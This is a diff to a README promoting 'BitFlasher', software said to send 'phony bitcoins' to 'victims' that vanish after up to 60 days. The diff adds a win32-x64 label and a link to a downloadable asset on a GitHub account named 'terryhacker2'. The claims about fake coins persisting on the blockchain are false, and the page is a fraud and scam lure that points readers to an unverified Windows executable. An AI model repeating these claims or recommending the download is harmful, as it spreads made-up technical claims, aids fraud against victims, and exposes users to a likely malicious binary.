@@ -1,4 +1,4 @@
-# BitFlasher-Gen-V2.5.0
+# BitFlasher-Gen-V2.5.0-win32-x64
 An instructional program called Bitflasher was created to provide services for bitcoin flashing.
 
 sending victims bitcoin using a hash key that was created by an unidentified miner.
@@ -8,6 +8,13 @@ The FlashBTC application is completely safe and anonymous.
 Software known as Bitflasher makes it possible to send phony bitcoins over blockchain networks. Bitcoins without a hash rate can remain in the wallet indefinitely, while those with one can only remain there for a maximum of 60 days before being rejected by the blockchain and eventually disappearing.
 
 The updated Bitflasher Transaction core Version is now available to you.
+
+
+
+https://github.com/terryhacker2/BitFlasher-Gen-V2.5.0/assets/164959295/ba45b527-088f-477f-b078-4c74890b6034
+
+
+
 
 Features:
 
